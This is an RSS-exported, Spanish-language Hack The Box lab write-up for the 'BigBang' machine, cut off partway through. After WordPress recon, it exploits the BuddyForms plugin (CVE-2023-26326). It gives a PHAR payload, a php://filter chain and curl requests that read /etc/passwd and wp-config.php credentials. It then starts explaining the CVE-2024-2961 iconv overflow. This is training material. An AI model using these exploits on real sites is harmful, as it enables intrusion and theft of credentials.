<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[HTB]]></title><description><![CDATA[Obsidian digital garden]]></description><link>http://github.com/dylang/node-rss</link><image><url>lib/media/favicon.png</url><title>HTB</title><link></link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Wed, 05 Feb 2025 16:21:19 GMT</lastBuildDate><atom:link href="lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Wed, 05 Feb 2025 16:21:16 GMT</pubDate><ttl>60</ttl><dc:creator></dc:creator><item><title><![CDATA[01-Recon]]></title><description><![CDATA[ 
 <br><br><br>Al entrar en el puerto 80 se redirige automaticamente al subdominio <a rel="noopener nofollow" class="external-link" href="http://blog.bigbang.htb/" target="_blank">http://blog.bigbang.htb/</a> por lo que lo guardamos en el '/etc/hosts'<br>echo "10.10.11.52 blog.bigbang.htb" &gt;&gt; /etc/hosts
<br>En el puerto 80 nos encontramos un blog de wordpress:<br>➜  BigBang wappalyzer -i http://blog.bigbang.htb
http://blog.bigbang.htb Apache HTTP Server v2.4.62, Debian, PHP v8.3.2, WordPress v6.5.4, Backbone.js v1.5.0, Clipboard.js, jQuery v3.7.1, jQuery Migrate v3.4.1, TinyMCE v4, Underscore.js v1.13.4, core-js v3.35.1, Dropzone v5.7.0, jQuery UI v1.13.2, Lodash v1.13.6, MediaElement.js v4.2.17, mOxie, Select2, Twitter Emoji (Twemoji), RSS
<br><img alt="Pasted image 20250131121917.png" src="machines/bigbang/imgs/pasted-image-20250131121917.png"><br><br>Vamos a fuzzear el wordpress para encontrar archivos accesibles interesantes:<br>➜  BigBang find /usr/share/seclists/ -type f -iname 'wordpress*'

/usr/share/seclists/Passwords/Honeypot-Captures/wordpress-attacks-july2014.txt
/usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/wordpress.txt
/usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/wordpress-all-levels.txt
/usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt
➜  BigBang feroxbuster -u http://blog.bigbang.htb -w /usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt

200      GET      182l      398w     3834c http://blog.bigbang.htb/wp-admin/css/color-picker.css
200      GET      384l     3177w    19915c http://blog.bigbang.htb/license.txt
200      GET        1l        1w        2c http://blog.bigbang.htb/wp-admin/admin-footer.php
200      GET        2l     1375w    58586c http://blog.bigbang.htb/wp-admin/css/customize-controls-rtl.min.css
200      GET      397l      781w     6223c http://blog.bigbang.htb/wp-admin/css/install-rtl.css
200      GET      396l      775w     6190c http://blog.bigbang.htb/wp-admin/css/install.css
200      GET      479l     1182w    12597c http://blog.bigbang.htb/wp-admin/css/customize-widgets-rtl.css
200      GET     2037l     3990w    37699c http://blog.bigbang.htb/wp-admin/css/edit.css
200      GET       16l       36w      490c http://blog.bigbang.htb/wp-admin/css/wp-admin-rtl.css
200      GET       16l       36w      490c http://blog.bigbang.htb/wp-admin/css/wp-tables.min.css

etc...
<br>Para una busqueda mas detallada del wordpress podemos usar <a data-tooltip-position="top" aria-label="https://wpscan.com/" rel="noopener nofollow" class="external-link" href="https://wpscan.com/" target="_blank">WpScan</a> que es una herramienta que nos permite buscar vulnerabilidades de wordpress<br>[+] URL: http://blog.bigbang.htb/ [10.10.11.52]
[+] Started: Fri Jan 31 13:23:49 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.62 (Debian)
 |  - X-Powered-By: PHP/8.3.2
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.bigbang.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blog.bigbang.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blog.bigbang.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blog.bigbang.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5.4 identified (Insecure, released on 2024-06-05).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.bigbang.htb/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=6.5.4&lt;/generator&gt;
 |  - http://blog.bigbang.htb/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=6.5.4&lt;/generator&gt;

[+] WordPress theme in use: twentytwentyfour
 | Location: http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.3
 | [!] Directory listing is enabled
 | Style URL: http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] buddyforms
 | Location: http://blog.bigbang.htb/wp-content/plugins/buddyforms/
 | Last Updated: 2025-01-30T02:58:00.000Z
 | [!] The version is out of date, the latest version is 2.8.15
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 2.7.7 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blog.bigbang.htb/wp-content/plugins/buddyforms/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:02 &lt;===============================================================================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:02

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Jan 31 13:24:01 2025
[+] Requests Done: 171
[+] Cached Requests: 5
[+] Data Sent: 44.029 KB
[+] Data Received: 778.725 KB
[+] Memory used: 296.125 MB
[+] Elapsed time: 00:00:12
➜  BigBang 


<br>Segun el Recon tenemos diferentes vectores de ataque:<br>Vectores:<br>
1.Wordpress V 6.5.4 (insecure)<br>
La version de wordpress esta desactualizada.<br>
<a data-tooltip-position="top" aria-label="https://www.tenable.com/plugins/was/114353" rel="noopener nofollow" class="external-link" href="https://www.tenable.com/plugins/was/114353" target="_blank">Info</a><br>
2.XML-RPC Habilitado<br>
Con ello podemos:<br>
Brute-forcing credenciales usando el xmlrpc.php endpoint.<br>
Amplificar los DoS.<br>
Ataques de Pingback (denial of service)<br>
3. Pluggin buddyforms desactualizado<br>
Vulnerable a <a data-tooltip-position="top" aria-label="https://nvd.nist.gov/vuln/detail/CVE-2023-26326" rel="noopener nofollow" class="external-link" href="https://nvd.nist.gov/vuln/detail/CVE-2023-26326" target="_blank">CVE-2023-26326</a><br>
4. El Theme de Wordpress 'twentytwentyfour'<br>
Tiene la version desactualizada la actual ultima version es la  1.3<br>
Tiene el Directory listing habilitado, en la siguiente <a data-tooltip-position="top" aria-label="https://wordpress.org/themes/twentytwentyfour/" rel="noopener nofollow" class="external-link" href="https://wordpress.org/themes/twentytwentyfour/" target="_blank">ruta</a><br><br>Encontramos varias API's a los que el servidor envia peticiones:<br>http://blog.bigbang.htb/wp-admin/admin-ajax.php
http://blog.bigbang.htb/wp-admin/upload.php
<br><br><a data-tooltip-position="top" aria-label="https://medium.com/tenable-techblog/wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8" rel="noopener nofollow" class="external-link" href="https://medium.com/tenable-techblog/wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8" target="_blank">articulo</a><br><br>Bueno esta vulnerabilidad cosniste en subir un archivo .phar malicioso mediante upload_image_from_url y luego llamarlo con el wrapper phar://<br>Pruebo primero a subir un gif para verificar que funciona el exploit; el codigo defectuoso se puede examinar en este <a data-tooltip-position="top" aria-label="https://github.com/BuddyForms/BuddyForms/blob/master/includes/functions.php#L1488" rel="noopener nofollow" class="external-link" href="https://github.com/BuddyForms/BuddyForms/blob/master/includes/functions.php#L1488" target="_blank">enlace</a>;<br>
A pesar de subirse el archivo en formato .png podemos observar que el gif funciona en la pagina por lo que podremos subir un archivo phar malicioso que el servidor interprete como GIF<br><img alt="Pasted image 20250202141748.png" src="machines/bigbang/imgs/pasted-image-20250202141748.png"><br>dado esto procedemos  construir un exploit php<br>&lt;?php  
  
class Evil{  
  public function __wakeup() : void {  
    die("Arbitrary Deserialization");  
  }  
}  
  
  
//create new Phar  
$phar = new Phar('evil.phar');  
$phar-&gt;startBuffering();  
$phar-&gt;addFromString('test.txt', 'text');  
$phar-&gt;setStub("GIF89a\n&lt;?php __HALT_COMPILER(); ?&gt;");  
  
// add object of any class as meta data  
$object = new Evil();  
$phar-&gt;setMetadata($object);  
$phar-&gt;stopBuffering();
<br>Lo convertimos  a phar:<br>php --define phar.readonly=0 evil.php
➜  CVE-2023-26326 strings evil.phar 
GIF89a
&lt;?php __HALT_COMPILER(); ?&gt;
O:4:"Evil":0:{}
test.txt
text
GBMB
<br>Gif89a son los magic bytes  que van a enganar a la funcion del buddyforms upload_image_from_url() de tal forma que podremos exfiltrar nuestro php disfrazado de gif;<br>Ahora lo subimos al endpoint vulnerable que admite PUT<br>
wp-admin/admin-ajax.php<br><img alt="Pasted image 20250131141905.png" src="machines/bigbang/imgs/pasted-image-20250131141905.png"><br>
El servidor nos devuelve una URL indicando donde se ha subido nuestro archivo malicioso; Comprobamos que se ha subido correctamente navegando a la URL<br>
http://blog.bigbang.htb/wp-content/uploads/2025/01/<br><img alt="Pasted image 20250131142115.png" src="machines/bigbang/imgs/pasted-image-20250131142115.png"><br>Bueno pues tenemos injecion exitosa de archivos . ahora a construir el payload;<br>Dado que continuo este writeup de nuevo dia he vuelto a subir el phar al servidor esta vez se guarda como 1-2.png dado que no puedo <br><img alt="Pasted image 20250202143150.png" src="machines/bigbang/imgs/pasted-image-20250202143150.png"><br><br><a data-tooltip-position="top" aria-label="https://github.com/ambionics/wrapwrap" rel="noopener nofollow" class="external-link" href="https://github.com/ambionics/wrapwrap" target="_blank">Git</a><br>Vamos a usar wrapwrap para disfrazar el /etc/password en un archivo GIF anadiendo el GIF89a Header:<br>(venv) ➜  wrapwrap git:(main) ✗ python3 wrapwrap.py -h
usage: wrapwrap.py [-h] [-o OUTPUT] [-p PADDING_CHARACTER] [-f] path prefix suffix nb_bytes

Generates a php://filter wrapper that adds a prefix and a suffix to the contents of a file.

Example:

    $ ./wrapwrap.py /etc/passwd '&lt;root&gt;&lt;test&gt;' '&lt;/test&gt;&lt;/root&gt;' 100
    [*] Dumping 108 bytes from /etc/passwd.
    [+] Wrote filter chain to chain.txt (size=88781).
    $ php -r 'echo file_get_contents(file_get_contents("chain.txt"));'
    &lt;root&gt;&lt;test&gt;root:x:0:0:root:/root:/bin/bash=0Adaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin=0Abin:x:2:2:bin:/bin:/usr/&lt;/test&gt;&lt;/root&gt;

positional arguments:
  path                  Path to the file
  prefix                A string to write before the contents of the file
  suffix                A string to write after the contents of the file
  nb_bytes              Number of bytes to dump. It will be aligned with 9

options:
  -h, --help            show this help message and exit
  -o OUTPUT, --output OUTPUT
                        File to write the payload to. Defaults to chain.txt
  -p PADDING_CHARACTER, --padding-character PADDING_CHARACTER
                        Character to pad the prefix and suffix. Defaults to `M`.
  -f, --from-file       If set, prefix and suffix indicate files to load their value from,
                        instead of the value itself

<br>Modificamos la evil_url para utilizar la cadena generada por wrapwrap , luego sube el archivo a través del endpoint vulnerable. Este método evita la restricción de tipo de archivo engañando al servidor para que interprete el archivo como una imagen. Con este enfoque, podemos realizar lectura de archivos arbitrarios y filtrar el contenido del archivo subido, que se supone que es una "imagen".<br>(venv) ➜  wrapwrap git:(main) ✗ python3 wrapwrap.py '/etc/passwd' 'GIF89a' '' 500000 
[!] Ignoring nb_bytes value since there is no suffix
[+] Wrote filter chain to chain.txt (size=1444).
(venv) ➜  wrapwrap git:(main) ✗ cat chain.txt 
───────┬──────────────────────────────────────────────────────────────────────────────────────
       │ File: chain.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────
   1   │ php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-
       │ 32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-
       │ 32LE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv
       │ .CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.i
       │ conv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF
       │ 7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_
       │ JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.i
       │ conv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775
       │ |convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.
       │ UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|co
       │ nvert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert
       │ .iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.b
       │ ase64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSI
       │ SO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|conv
       │ ert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.
       │ IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|con
       │ vert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource=/etc/passwd
───────┴───────────────────────────────────────
<br>Ahora modificamos la evil_url para utilizar la cadena generada por wrapwrap , luego súbela a través del punto de entrada vulnerable. Esto evita la restricción de tipo de archivo al engañar al servidor para que interprete el archivo como una imagen. Con este método, podemos realizar con éxito la lectura de archivos arbitrarios, filtrando los contenidos del archivo subido (que se interpreta como una "imagen").<br>wrapwrap git:(main) ✗ export evil_url="$(cat chain.txt )" 

wrapwrap git:(main) ✗ curl 'http://blog.bigbang.htb/wp-admin/admin-ajax.php' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-d "action=upload_image_from_url&amp;id=1&amp;accepted_files=image/gif&amp;url=${evil_url}"

{"status":"OK","response":"http:\/\/blog.bigbang.htb\/wp-content\/uploads\/2025\/02\/1-4.png","attachment_id":159}%        

(venv) ➜  wrapwrap git:(main) ✗ curl 'http://blog.bigbang.htb//wp-content//uploads//2025//02//1-4.png' -o exploited.png
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   843  100   843    0     0   7500      0 --:--:-- --:--:-- --:--:--  7526
(venv) ➜  wrapwrap git:(main) ✗ strings exploited.png 
GIF89aroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologi

<br>Parece que estamos en un contenedor docker al no haber mas usuarios que root con el bash;<br>
vamos a intentar leer el wp-config con el mismo procedimiento:<br>(venv) ➜  wrapwrap git:(main) ✗ python3 wrapwrap.py '../wp-config.php' 'GIF89a' '' 500000
[!] Ignoring nb_bytes value since there is no suffix
[+] Wrote filter chain to chain.txt (size=1449).
(venv) ➜  wrapwrap git:(main) ✗ export evil_url="$(cat chain.txt )"                     
(venv) ➜  wrapwrap git:(main) ✗ curl 'http://blog.bigbang.htb/wp-admin/admin-ajax.php' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-d "action=upload_image_from_url&amp;id=1&amp;accepted_files=image/gif&amp;url=${evil_url}"

{"status":"OK","response":"http:\/\/blog.bigbang.htb\/wp-content\/uploads\/2025\/02\/1-5.png","attachment_id":160}%  

(venv) ➜  wrapwrap git:(main) ✗ curl 'http://blog.bigbang.htb//wp-content//uploads//2025//02//1-5.png' -o wpconfig.png
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3348  100  3348    0     0  22633      0 --:--:-- --:--:-- --:--:-- 22775


(venv) ➜  wrapwrap git:(main) ✗ strings wpconfig.png 
GIF89a&lt;?php
 * The base configuration for WordPress
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 * This file contains the following configurations:
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 * @package WordPress
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );
/** Database username */
define( 'DB_USER', 'wp_user' );
/** Database password */
define( 'DB_PASSWORD', 'wp_password' );
/** Database hostname */
define( 'DB_HOST', '172.17.0.1' );
/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );
/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
/**#@+
 * Authentication unique keys and salts.
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 * @since 2.6.0
define( 'AUTH_KEY',         '(6xl?]9=.f9(&lt;(yxpm9]5&lt;wKsyEc+y&amp;MV6CjjI(0lR2)_6SWDnzO:[g98nOOPaeK' );
define( 'SECURE_AUTH_KEY',  'F&lt;3&gt;KtCm^zs]Mxm Rr*N:&amp;{SWQexFn@ wnQ+bTN5UCF-&lt;gMsT[mH$m))T&gt;BqL}%8' );
define( 'LOGGED_IN_KEY',    ':{yhPsf}tZRfMAut2$Fcne/.@Vs&gt;uukS&amp;JB04 Yy3{`$`6p/Q=d^9=ZpkfP,o%l]' );
define( 'NONCE_KEY',        'sC(jyKu&gt;gY(,&amp;: KS#Jh7x?/CB.hy8!_QcJhPGf@3q&lt;-a,D#?!b}h8 ao;g[&lt;OW;' );
define( 'AUTH_SALT',        '_B&amp; tL]9I?ddS! 0^_,4M)B&gt;aHOl{}e2P(l3=!./]~v#U&gt;dtF7zR=~LnJtLgh&amp;KK' );
define( 'SECURE_AUTH_SALT', '&lt;Cqw6ztRM/y?eGvMzY(~d?:#]v)em`.H!SWbk.7Fj%b@Te&lt;r^^Vh3KQ~B2c|~VvZ' );
define( 'LOGGED_IN_SALT',   '_zl+LT[GqIV{*Hpv&gt;]H:&lt;U5oO[w:]?%Dh(s&amp;Tb-2k`1!WFqKu;elq7t^~v7zS{n[' );
define( 'NONCE_SALT',       't2~PvIO1qeCEa^+J}@h&amp;x&lt;%u~Ml{=0Orqe]l+DD7S}%KP}yi(6v$mHm4cjsK,vCZ' );
/**#@-*/
 * WordPress database table prefix.
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
$table_prefix = 'wp_';
 * For developers: WordPress debugging mode.
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
define( 'WP_DEBUG', false );
/* Add any custom values between this line and the "stop editing" line. */
/* That's all, stop editing! Happy publishing. */
/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';


<br>Confirmamos que es un container dado que la base de datos se encuentra alojada en la 172.17.0.1 que es un rango IP que usa docker por defecto; vamos a sacar el wp-settings.php<br>(venv) ➜  wrapwrap git:(main) ✗ python3 wrapwrap.py '../wp-settings.php' 'GIF89a' '' 500000
[+] Wrote filter chain to chain.txt (size=1451).

(venv) ➜  wrapwrap git:(main) ✗ curl 'http://blog.bigbang.htb/wp-admin/admin-ajax.php' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-d "action=upload_image_from_url&amp;id=1&amp;accepted_files=image/gif&amp;url=${evil_url}"

{"status":"OK","response":"http:\/\/blog.bigbang.htb\/wp-content\/uploads\/2025\/02\/1-6.png","attachment_id":161}%  

(venv) ➜  wrapwrap git:(main) ✗ curl 'http://blog.bigbang.htb//wp-content//uploads//2025//02//1-5.png' -o wpsettings.png
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3348  100  3348    0     0   1592      0  0:00:02  0:00:02 --:--:--  1592
(venv) ➜  wrapwrap git:(main) ✗ python3 wrapwrap.py '../wp-settings.php' 'GIF89a' '' 500000
(venv) ➜  wrapwrap git:(main) ✗ strings wpsettings.png 

GIF89a&lt;?php
 * The base configuration for WordPress
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 * This file contains the following configurations:
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 * @package WordPress
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );
/** Database username */
define( 'DB_USER', 'wp_user' );
/** Database password */
define( 'DB_PASSWORD', 'wp_password' );
/** Database hostname */
define( 'DB_HOST', '172.17.0.1' );
/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );
/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
/**#@+
 * Authentication unique keys and salts.
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 * @since 2.6.0
define( 'AUTH_KEY',         '(6xl?]9=.f9(&lt;(yxpm9]5&lt;wKsyEc+y&amp;MV6CjjI(0lR2)_6SWDnzO:[g98nOOPaeK' );
define( 'SECURE_AUTH_KEY',  'F&lt;3&gt;KtCm^zs]Mxm Rr*N:&amp;{SWQexFn@ wnQ+bTN5UCF-&lt;gMsT[mH$m))T&gt;BqL}%8' );
define( 'LOGGED_IN_KEY',    ':{yhPsf}tZRfMAut2$Fcne/.@Vs&gt;uukS&amp;JB04 Yy3{`$`6p/Q=d^9=ZpkfP,o%l]' );
define( 'NONCE_KEY',        'sC(jyKu&gt;gY(,&amp;: KS#Jh7x?/CB.hy8!_QcJhPGf@3q&lt;-a,D#?!b}h8 ao;g[&lt;OW;' );
define( 'AUTH_SALT',        '_B&amp; tL]9I?ddS! 0^_,4M)B&gt;aHOl{}e2P(l3=!./]~v#U&gt;dtF7zR=~LnJtLgh&amp;KK' );
define( 'SECURE_AUTH_SALT', '&lt;Cqw6ztRM/y?eGvMzY(~d?:#]v)em`.H!SWbk.7Fj%b@Te&lt;r^^Vh3KQ~B2c|~VvZ' );
define( 'LOGGED_IN_SALT',   '_zl+LT[GqIV{*Hpv&gt;]H:&lt;U5oO[w:]?%Dh(s&amp;Tb-2k`1!WFqKu;elq7t^~v7zS{n[' );
define( 'NONCE_SALT',       't2~PvIO1qeCEa^+J}@h&amp;x&lt;%u~Ml{=0Orqe]l+DD7S}%KP}yi(6v$mHm4cjsK,vCZ' );
/**#@-*/
 * WordPress database table prefix.
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
$table_prefix = 'wp_';
 * For developers: WordPress debugging mode.
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
define( 'WP_DEBUG', false );
/* Add any custom values between this line and the "stop editing" line. */
/* That's all, stop editing! Happy publishing. */
/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
<br>CVE-2024–2961 | Buffer Overflow<br>Vamos a explotar la  vulnerabilidad CVE-2024–2961 , un buffer overflow presente en la biblioteca GNU libiconv. Esta vulnerabilidad permite ejecución remota de código (RCE) debido a una mala validación de entrada durante la conversión entre conjuntos de caracteres. Aunque el exploit es complejo y requiere conocimientos avanzados de explotación binaria, intentaremos desglosarlo paso a paso para facilitar su comprensión.<br>La vulnerabilidad fue descubierta en el contexto del plugin BuddyForms de WordPress, lo que la hace especialmente relevante para ataques web. Vamos a analizar cómo funciona esta vulnerabilidad desde una perspectiva técnica, centrándonos en los conceptos clave necesarios para su explotación.<br><br><br>libiconv es una biblioteca utilizada para convertir texto entre diferentes conjuntos de caracteres (charset). En PHP, muchas funciones de manipulación de cadenas dependen de esta biblioteca, especialmente cuando se usa la función iconv(). La vulnerabilidad radica en cómo libiconv maneja ciertos caracteres exóticos en el conjunto de caracteres ISO-2022-CN-EXT .<br><br>El conjunto de caracteres ISO-2022-CN-EXT utiliza secuencias de escape (ESC bytes, como \x1B) para cambiar dinámicamente entre diferentes codificaciones de caracteres. Cada carácter puede requerir hasta 4 bytes :<br>
<br>2 bytes para la secuencia de escape.
<br>2 bytes para el carácter codificado.
<br>Por ejemplo:<br>
<br>El carácter 劄 podría ser codificado como ESC $ * H (en formato hexadecimal: \x1B\x24\x2A\x48).
<br>Cuando libiconv procesa estos caracteres, debe escribir 4 bytes en el búfer de salida. Sin embargo, falta una verificación adecuada del tamaño del búfer , lo que puede provocar un desbordamiento de búfer si no hay suficiente espacio disponible.<br><br>Antes de profundizar en la explotación, es importante entender cómo funciona el manejo de memoria en PHP:<br><br>PHP utiliza funciones como emalloc(N) para asignar bloques de memoria de tamaño N y devuelve un puntero a esa memoria. Cuando un bloque ya no es necesario, se libera con efree(ptr).<br><br>El montón de PHP está dividido en regiones de 2MB , subdivididas en páginas de 4KB (0x1000 bytes) . Cada página almacena bloques (chunks) de un tamaño específico:<br>
<br>Página 10: Bloques de 0x100 bytes .
<br>Página 11: Bloques de 0x38 bytes .
<br>Y así sucesivamente...
<br>No hay metadatos entre bloques para rastrear asignaciones, lo que lo hace eficiente pero vulnerable a desbordamientos, ya que no hay verificaciones de seguridad entre bloques en el montón.<br><br>Los bloques liberados se añaden a listas libres (free lists), que son listas enlazadas simples (inseguras comparadas con listas doblemente enlazadas). Cuando se llama a efree(ptr), el bloque se agrega al inicio de la lista libre (comportamiento LIFO).<br>Si ocurre un desbordamiento en un bloque adyacente, se puede sobrescribir el puntero almacenado en el primer byte del bloque libre, alterando la estructura de la lista libre. Esto permite controlar dónde se asignará el siguiente bloque, lo que es crítico para la explotación.<br><br><br>El protocolo php://filter es ampliamente utilizado para aplicar filtros a recursos locales o remotos. Vamos a entender cómo PHP maneja este mecanismo:<br><br>Cuando PHP lee un recurso (por ejemplo, /etc/passwd), lo carga en un flujo representado por una brigada de cubetas (bucket brigade) :<br>
<br>Una brigada de cubetas es una lista enlazada doble de cubetas, donde cada cubeta contiene un búfer con una parte de los datos del recurso.
<br>Ejemplo: /etc/passwd podría estar dividido en:

<br>Cubeta 1: Primeros 5 bytes.
<br>Cubeta 2: Siguientes 30 bytes.
<br>Cubeta 3: Siguientes 1000 bytes.


